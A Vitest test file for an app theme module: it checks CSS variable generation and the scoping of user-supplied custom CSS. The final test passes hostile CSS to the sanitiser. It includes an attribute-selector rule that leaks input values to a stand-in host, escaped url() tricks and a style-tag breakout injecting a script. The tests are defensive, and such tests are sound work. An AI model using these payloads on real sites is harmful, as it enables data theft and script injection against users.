import { describe, expect, it } from 'vitest'
import { scopedCss, themeStyle } from './theme-model'

describe('the app theme', () => {
  it('overrides the palette under the tokens, inside the app', () => {
    expect(themeStyle(undefined)).toEqual({})
    const style = themeStyle({
      primary: '#7c3aed',
      text: '#111111',
      background: '#fafafa',
      radius: 10,
      font: 'serif',
    })
    expect(style['--blue-3']).toBe('#7c3aed')
    expect(style['--blue-4']).toBe('color-mix(in srgb, #7c3aed 82%, black)')
    expect(style['--blue-1']).toBe('color-mix(in srgb, #7c3aed 12%, var(--shade-1))')
    expect(style['--ink-1']).toBe('#111111')
    expect(style.backgroundColor).toBe('#fafafa')
    expect(style['--radius-md']).toBe('10px')
    expect(style['--radius-sm']).toBe('5px')
    expect(style.fontFamily).toContain('serif')
    expect(themeStyle({ danger: '#ff0000' })).toMatchObject({ '--red-3': '#ff0000' })
  })
})

describe('custom CSS', () => {
  const root = '[data-app-root="a1"]'
  it('nests under the app root', () => {
    expect(scopedCss('.title { color: red; }', root)).toBe(`${root} {\n.title { color: red; }\n}`)
    expect(scopedCss('  ', root)).toBe('')
    expect(scopedCss(undefined, root)).toBe('')
  })

  it('loads nothing from elsewhere and cannot close its style element', () => {
    const css = scopedCss(
      `@import url("https://x.example/a.css");
input[value^="a"] { background: url(https://x.example/leak?a) }
.b { background-image: image-set("https://x.example/1.png" 1x); }
.c { background: u\\72l(https://x.example/escaped) }
.d { background: ur\\l(https://x.example/split) }
/* url(hidden) */ </style><script>alert(1)</script>`,
      root,
    )
    expect(css).not.toMatch(/url\(|@import|image-set\(|<\/style|x\.example\/(leak|split)|\\/i)
    expect(css).toContain('background: none')
  })
})
